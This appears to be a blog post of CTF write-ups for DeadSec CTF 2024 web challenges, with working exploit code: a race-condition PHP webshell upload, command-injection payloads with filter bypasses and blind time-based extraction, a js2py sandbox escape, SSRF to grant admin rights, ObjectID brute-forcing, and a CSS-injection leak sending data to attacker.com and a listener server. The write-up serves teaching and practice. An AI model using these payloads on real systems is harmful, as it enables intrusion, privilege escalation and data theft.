---
layout: posts
title: "DeadSec CTF 2024 Web Writeups"
permalink: /test
categories: [CTF, Writeups]
tags: [ctf, writeups, deadsec-ctf]
socialImage: "/static/images/deadsec-writeups/deadsec.png"
---

This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the [DeadSec](https://deadsec.ctf.ae/) team. The CTF was held on 28th July 2024. My team scored place 48/619 with 1081 points.


# Web

## EzStart

- Difficulty: Easy

![EzStart](/static/images/deadsec-writeups/ezstart.png)

I started analyzing the provided source code, there is only one interesting file for us to discuss, the `src/upload.php`

![EzStart-Code](/static/images/deadsec-writeups/ezstart-01.png)

In the code, we can see that we can upload any kind of file regarding the written filters because they were pointless (no prevention after the checks). Still, the notable thing is that anything we upload is going to be deleted at the end through `unlink()`, moreover, if we upload a file with `< 10MB` size it will be moved from PHP's uploads tmp folder to accessible `/var/www/html/tmp` folder then will be removed at the end.

For the upload filename, we can't specify anything existent to overwrite or cause deletion like the index.html or anything, we can't also do path traversal because the basename and the ext were only taken from the filename

```php
	$uploadpath = "tmp/";
    $ext = pathinfo($_FILES["files"]["name"], PATHINFO_EXTENSION);
    $filename = basename($_FILES["files"]["name"], "." . $ext);
    $timestamp = time();
    $new_name = $filename . '_' . $timestamp . '.' . $ext;
    $upload_dir = $uploadpath . $new_name;
```

Clearly, we can't do anything but a race condition, the only issue is the `$timestamp` that we can't exactly predict but can be brute-forced.

We need to upload a PHP file that will read the `/flag.txt` (which we know about its location from the Dockerfile) and simultaneously try to access that file.

I created the following script which will do all the work

```python
#!/usr/bin/python3
import requests
import threading
import datetime
import os
import re


# url = f"http://127.0.0.1/"
url = "https://da93b7e95bdffb4bb4d946e2.deadsec.quest/"
max_threads = 50  # Set the maximum number of threads

def access_payload(timestamp):
    file_name = f"shell_{int(timestamp)}.php"
    response = requests.get(url + "tmp/" + file_name)
    res = response.text
    if "The requested URL was not found on this server" in res:
        return False
    flag = re.findall(r"DEAD{.*}", res)
    if flag:
        print(flag[0])
        print("Killing Task...")
        os.kill(os.getpid(), 9)
        return flag

    return flag


def upload_payload():
    file_content = """
    <?php
    system("cat /f*");
    ?>
    """
    files = {"files": ("shell.php", file_content, "application/octet-stream")}
    response = requests.post(url + "upload.php", files=files)
    return response


if __name__ == "__main__":
    print("Using Max Threads of ", max_threads)
    for i in range(65535):
        current_timestamp = int(datetime.datetime.now().timestamp())
        t = threading.Thread(target=access_payload, args=(current_timestamp,))
        t2 = threading.Thread(target=upload_payload)

        t.start()
        t2.start()
        if threading.active_count() > max_threads:
            t.join()
            t2.join()
            print("Max Threads Reached")
            
```

And got the flag in no time 🙂

![EzStart-PoC](/static/images/deadsec-writeups/ezstart-02.png)



## Bing2

- Difficulty: Easy

![Bing2](/static/images/deadsec-writeups/bing2.png)

This one is a command injection in the `bing.php` `host` parameter, it pings the host we provide and we can inject commands there. The trick here is to bypass the filters and read the flag `/flag.txt` which one of the filters is to *delete* the keyword `cat` and `flag` from many others in the input.

![Bing2](/static/images/deadsec-writeups/bing2-01.png)

Because it *removes* the keywords we can use that to generate our keywords like this:

```sh
➜  Bing2 curl -XPOST https://d931e8d7082cacac0d2a37f7.deadsec.quest/bing.php -d "Submit" -d 'ip=;id;cacatt${IFS}/f*'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
DEAD{5b814948-3153-4dd5-a3ac-bc1ec706d766}
```

I also used `${IFS}` as a space because spaces are blacklisted too


## Bing_Revenge

- Difficulty: Easy

![Bing_Revenge](/static/images/deadsec-writeups/bing_revenge.png)

This one takes different approach than the previous, it's a python application that will execute the command we provide in the `host` parameter, the trick here is nothing printed what so ever in the response, so we need to find a way to read the flag `/flag.txt` without seeing the output. Unfortunately, we can't have out of band access to the server because of the firewall.

![Bing_Revenge](/static/images/deadsec-writeups/bing_revenge-01.png)

In this case we can take the same approach used for time-based SQL injections, we will be reading the flags chars and comparing them, whenever our guess is correct we will sleep for few seconds (I used 7 because the server was slow).

The pseudo code will look like this:
```python
payload = f";if [ $(cat /flag.txt | cut -c{c_i+1} | grep -c '{c}') -eq 1 ]; then sleep {str(sleep_time)}; fi"
r = requests.post(url, data={"host": payload})
if r.elapsed.total_seconds() > sleep_time:
    # we guessed the char correctly
```

Automating this with python is great and would work fine locally, but the server was slow and there might be many errors to catch through the way, so I used BurpSuite Intruder during the ctf where I sent all the possible chars for each char address `-c ..`, checked the response time that are > 7 seconds and grabbed the flag manually.

But here is the python script that I used locally:
    
```python
#!/bin/python3
import requests
from string import printable

url = "http://127.0.0.1:5000/flag"
flag = "DEAD{"
sleep_time = 1

chars = printable
# those always return true in the search
chars = (
    chars.replace(".", "").replace("$", "").replace("^", "")
)  # mostly the flag charset is a-zA-Z0-9{}_-


def request(payload):
    data = {"host": payload}
    try:
        r = requests.post(url, data=data, timeout=15, verify=False)
    except requests.exceptions.ConnectionError:
        return request(payload)
    if r.status_code != 200 or "Error" in r.text:
        return request(payload)

    return r.elapsed.total_seconds()


c_i = len(flag)
while True:
    for c in chars:
        payload = f";if [ $(cat /flag.txt | cut -c{c_i+1} | grep -c '{c}') -eq 1 ]; then sleep {str(sleep_time)}; fi"  # this way it is possible to implement threading, but it will overload the server so I didn't try it.
        print(f"Tyring {c}", end="\r")
        r = request(payload)
        while sleep_time > r + 4:  # to handle possible falst posatives
            r = request(payload)
        if r >= sleep_time and r:
            print()
            flag += c
            print(flag)
            print()
            break
    if flag[-1] == "}":
        break

    c_i += 1


print()
print("Done")
print(flag)
```

## Retro-calculator

- Difficulty: Hard

![Retro-calculator](/static/images/deadsec-writeups/retro-calculator.png)

This one was a fun challenge, it's a simple calc the trick here is that the calculator is written js2py which is a python library that can execute javascript code.

First there wasn't any source code, so I started analyzing and fuzzing arround to see what's running under the hood, when I tried to use \`\` to execute commands I got the following error:

![Retro-calculator](/static/images/deadsec-writeups/retro-calculator-01.png)

First I thought it's totally JS backend but after searching for the error I found that it's js2py from [here](https://stackoverflow.com/questions/64855107/how-to-render-ecmascript-6-with-python)

I didn't want to start fuzzing what works and what doesn't or whether there was any WAFs, I started looking for any possible CVEs and found unresolved one [CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape). I copied the `poc.py` payload and tried to execute, there where I started to dive into the endless "Hacking Attempts" rabbit hole.

![Retro-calculator](/static/images/deadsec-writeups/retro-calculator-02.png)

I am sure this is the worst way to go, but I kept playing around with the payload until it actually just worked (+1 for trying harder approach).

```js
let cmd = 'ls /; cat /flag.txt; '; cmd;let hacked, bymarve, n11;let getattr, obj;hacked = Object.getOwnPropertyNames({});bymarve = hacked.__getattribute__;n11 = bymarve('__getattribute__');obj = n11('__class__').__base__;getattr = obj.__getattribute__;function findpopen(o) {let result; let zed = '__sub' + 'classes__';for (let i in  o[zed]()){ let item = o[zed]()[i];let nm='__name__'; let sb='subp'+'roces';if (item.__module__ == sb+'s' &&item.__name__=='P'+'open'){return item}if(item.__name__!='type'&&(result=findpopen(item))){ return result } }};n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
```

That was weird but fun!

## Colorful Board

- Difficulty: Medium

![Colorful Board](/static/images/deadsec-writeups/colorful-board.png)

We are finally there, I liked this challenge so much and was so exicted to make a writeup for it.
This challenge is *another* source analysis, we have a nestjs application with mongodb (exicting right?) I will analyze and discuss the interesting parts of the code and the controls that we have briefly to you later understand how I crafted the exploit or how I thought about it.

We have four controllersas follow:
- `auth.controller.ts` which is responsible for the authentication and the login and registeration, it has the following endpoints:
  - `GET/POST /auth/register`
  - `GET/POST /auth/login`
- `post.controller.ts` which is responsible for the posts management, view/edit/write, it has the following endpoints:
  - `GET /post`
  - `GET /post/all`
  - `GET/POST /post/write`
  - `GET/POST /post/edit/:id` - Only Admin
  - `GET/POST /post/:id`
- `admin.controller.ts` which is responsible for the admin functions, it has the following endpoints:
  - `GET /admin/grant?username` Only localhost access
  - `GET /admin/notice` Only Admin
  - `GET /admin/report` - Anyone logged in (doesn't have to be admin)
  - `GET /admin/notice/:id` - Only Admin

- `user.controller.ts` which is responsible for the user profile and the user data, it has no endpoints just utilities used across the app

Those are the endpoints with functionalities, we will dive in details in what we needs when times come.

Now before we start diving into exploiting it, we need to answer few questions, where is the flag? what else is running in the application?

Looking at the sources files we have `init-data.js`
```js
// ...
const init_db = async () => {
    await db.users.insertMany([
        { username: "DEAD{THIS_IS_", password: "dummy", personalColor: "#000000", isAdmin: true },
    ]);
    await delay(randomDelay());
    await db.notices.insertOne({ title: "asdf", content: "asdf" });
    await delay(randomDelay());
    await db.notices.insertOne({ title: "flag", content: "FAKE_FLAG}" });
    await delay(randomDelay());
    await db.notices.insertOne({ title: "qwer", content: "qwer" });
}
init_db();
// ..
```

Interesting, part of the flag is part of the admin's username and the other part is part of the notices, moreover there is no way in the application to expose someone's username if he didn't post anything, and for the second part we need to know the notice id to access it, because the `GET /admin/notice/` doesn't show the Notice ID if it includes "flag" in the title, Finally we need to be an admin to access the notices.
```js
@Get('/notice')
    @UseGuards(AdminGuard) // Only Admin
    @Render('notice-main')
    async renderAllNotice() {
        const notices = await this.adminService.getAllNotice();
        return { notices: notices.filter(notice => !notice.title.includes("flag")) }; // Fun!
    }
```

- Becoming Admin 

A lot of work to do, let's split the steps first thing first, we need to be an admin, after spending hours in the code looking for what could work and what couldn't, we can call the `GET /admin/grant?username` through the `GET /admin/report` endpoin because it has no restrictions or filters.

```sh
➜  Colorful-Board curl 'https://eb7655042aed5ebaba63a259.deadsec.quest/admin/report?url=http://127.0.0.1:1337/admin/grant?username=oz' -H "Cookie: $cookie"
{"status":200,"message":"Reported."}
```

We relogin and now are Admin!
```sh
➜  sample-colorful_board curl 'https://eb7655042aed5ebaba63a259.deadsec.quest/admin/notice' -H "Cookie: $cookie"
<!DOCTYPE html>
<html lang="ko">
# ..
# ..
```

- Getting the second part of the flag

Now we can see the notices but not the one that has the flag, we will skip the first part for now and focus on the second part you will see why later (it's easier 😅).

We have two notices IDs and the flag is inbetween them
```html
<h2><a href="/admin/notice/66a67f8a5abd7894b69f2d68">asdf</a></h2>
<h2><a href="/admin/notice/66a67f905abd7894b69f2d6a">qwer</a></h2>
```
If you notice the IDs are similar, only minor and predictable because of how mongodb ObjectID works. During the CTF my script was trying all possible iterations on the differencet characters because somehow the difference was only 2 characters which is a small charset to bruteforce. Now it's 3 so it's not efficient I had to find another way to predict that and it's when I found this [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb#mongo-objectid-predict) page.
This gives a better idea on how we should predict the id, `66a67f8a5abd7894b69f2d68` is the first and `66a67f905abd7894b69f2d6a` is the third, the last char differ by 2 i.e in the middle our flag notice id will end with 9, left two more chars which just need to be bruteforced.

If we look at the IDs in our local image it will look like this which will comfirm that which is also detailed in the article linked above.
```json
cb> db.notices.find()
[
  {
    _id: ObjectId('66a66e63387296b1ad9f2d68'),
    title: 'asdf',
    content: 'asdf'
  },
  {
    _id: ObjectId('66a66e68387296b1ad9f2d69'),
    title: 'flag',
    content: 'FAKE_FLAG}'
  },
  {
    _id: ObjectId('66a66e6c387296b1ad9f2d6a'),
    title: 'qwer',
    content: 'qwer'
  }
]
```
And here is the final script to automate everything we done so far and get the second part of the flag.
```py
#!/usr/bin/python3
import requests
import re
import threading

# url = "http://127.0.0.1:1337/"
url = "https://eb7655042aed5ebaba63a259.deadsec.quest/"
creds = {"username": "oz", "password": "oz", "personalColor": "blue"}
access_token = ""
flag_id = ""

s = requests.Session()

requests.post(url + "auth/register", json=creds)
r = s.post(url + "auth/login", json=creds)
s.cookies.set("accessToken", r.json()["accessToken"])

s.get(
    url
    + f"admin/report?url=http://localhost:1337/admin/grant?username={creds['username']}"
)

s.cookies.clear()
r = s.post(url + "auth/login", json=creds)
s.cookies.set("accessToken", r.json()["accessToken"])

r = s.get(url + "admin/notice")
ids = re.findall(r"notice/([a-f0-9]+)", r.text)
print(ids)


def get_id(id):
    global s
    try:
        r = s.get(url + f"admin/notice/{id}")
    except:
        return get_id(id)
    return r


def process_id(id):
    r = get_id(id)
    if "flag" in r.text:
        print()
        print(r.text)
        exit()
    print(id, end="\r")


threads = []
max_threads = 50

for b1, b2 in zip(ids[0], ids[1]):
    if b1 == b2:
        flag_id += b1
    else:
        flag_id += "#"
flag_id = flag_id[:-1] + "9"  # last char is always 9

for i in range(0, 0xFF):  # we could use itertools.product but it's not necessary

    id = flag_id.replace("##", hex(i)[2:])
    t = threading.Thread(target=process_id, args=(id,))
    threads.append(t)
    t.start()

    if len(threads) > max_threads:
        for t in threads:
            t.join()
        threads = []

for t in threads:
    t.join()

```

And we got the first part!

![Colorful Board](/static/images/deadsec-writeups/colorful-board-01.png)

- Getting the first part of the flag

Now to get the first part I spent some hours looking around, until I thought that the challenge name should mean something especially that when we do register we can specify a color to have for our user account which is used in some places in the application.

![Colorful Board](/static/images/deadsec-writeups/colorful-board-02.png)

How is that relevant? We can use this to inject some CSS/XSS(doesn't work) to leak the admin's page or some of it's content when doing report. Now let's skip the XSS though I spent most of the time trying to make it work, but on the website nothing reflects and outside the website we can't access it's content or do CSRF because of the same-origin policy.

So now we have [CSS injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection) we need a good page to leak the flag from, the `/post/edit/:id` which the admin can access has what we need
```sh
common/views/post-edit.hbs:            color: {{{ user.personalColor }}}
```
![Colorful Board](/static/images/deadsec-writeups/colorful-board-03.png)

Now from the hacktricks we know we can leak chars from the page by using the `background-image` like this for example:
```css
input[class=user][value^="D"] {
    background-image: url("http://attacker.com/flag/D");
}
```
If the flag starts with `D` we will get a request to `http://attacker.com/flag/D` and so on for the rest of the flag.

Now all we need is a script to generate accounts with different colors chars to see what the flag looks like, I have seen many solves and all of them were semi-automated because of how this whole thing is. So here is a little different approach 🙂
```py
#!/usr/bin/python3

import flask
import requests
from string import digits, ascii_letters
import re
import threading
from requests.adapters import HTTPAdapter, Retry

app = flask.Flask(__name__)

url = "https://eb7655042aed5ebaba63a259.deadsec.quest/"
server = "http://REDACTED/"
charset = ascii_letters + digits + "_{}-"flag = "DEAD{"

max_threads = 5


def check_flag(i):
    payload = {
        "username": f"ozs{flag + i}",
        "password": "oz",
    }
    payload["personalColor"] = (
        f"blue;"
        + "}"
        + f"input[class='user'][value^='{flag + i}']"
        + "{"
        + f"background-image: url('{server}oz/{flag + i}')"
    )
    payload["username"] = "ozs" + flag + i
    s = requests.Session()
    retries = Retry(
        total=10, backoff_factor=1, status_forcelist=[i for i in range(500, 600)]
    )
    s.mount("http://", HTTPAdapter(max_retries=retries))

    s.post(url + "auth/register", json=payload)
    r = s.post(url + "auth/login", json=payload)
    s.cookies.set("accessToken", r.json()["accessToken"])

    s.post(url + "post/write", json={"title": "test", "content": "test"})
    r = s.get(url + "post/")
    post_id = re.findall(r"post/([a-f0-9]+)", r.text)[0]
    print(post_id, flag + i)
    r = s.get(url + f"admin/report?url=http://localhost:1337/post/edit/{post_id}")
    print(r.text)
    return


@app.route("/solve")
def solve():
    oldflag = flag
    threads = []
    for i in charset:
        if oldflag != flag:
            break

        t = threading.Thread(target=check_flag, args=(i,))
        t.start()
        threads.append(t)

        if len(threads) > max_threads:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.start()
    return "OK"


@app.route("/oz/<path:path>")
def catch_all(path):
    global flag
    print(path)
    flag = path

    threading.Thread(target=solve).start()

    return "OK"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

![Colorful Board](/static/images/deadsec-writeups/colorful-board-04.png)